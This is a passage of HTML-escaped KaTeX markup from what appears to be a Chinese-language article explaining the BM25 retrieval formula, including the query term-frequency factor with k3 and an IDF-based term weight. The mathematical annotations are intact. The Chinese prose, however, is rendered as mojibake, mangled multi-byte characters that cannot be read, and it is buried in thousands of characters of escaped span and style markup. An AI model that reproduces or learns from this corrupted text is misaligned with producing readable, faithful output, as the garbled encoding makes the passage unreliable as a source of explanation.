mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.5746399999999998em;vertical-align:-0.5423199999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.03232em;&#34;&gt;&lt;span style=&#34;top:-2.655em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.16454285714285719em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;e&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.29634285714285713em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2818857142857143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.50732em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mopen mtight&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose mtight&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.29634285714285713em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2818857142857143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.5423199999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œè¿™é‡Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;tf_{tq}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.980548em;vertical-align:-0.286108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.28055599999999997em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;è¡¨ç¤ºå•è¯åœ¨queryä¸­çš„è¯é¢‘ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;k_3&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;æ˜¯ä¸€ä¸ªå¯è°ƒæ­£å‚æ•°ï¼Œæ¥çŸ«æ­£queryä¸­çš„è¯é¢‘èŒƒå›´ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;æ¯ä¸ªå•è¯çš„æƒé‡ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;W_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;è¡¨ç¤ºåˆ†è¯æƒé‡ï¼Œè¿™é‡Œç”¨IDFä»£æ›¿ï¼š&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;0.5&lt;/mn&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;0.5&lt;/mn&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;IDF(q_i)=log(\frac{N-df_i+0.5}{df_i+0.5})&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.4133239999999998em;vertical-align:-0.481108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.9322159999999999em;&#34;&gt;&lt;span style=&#34;top:-2.6550000000000002em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3280857142857143em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.446108em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3280857142857143em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.481108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;N&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;è¡¨ç¤ºç´¢å¼•ä¸­å…¨éƒ¨æ–‡æ¡£æ•°é‡ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;df_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;è¡¨ç¤ºåŒ…å«äº†åˆ†è¯&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span 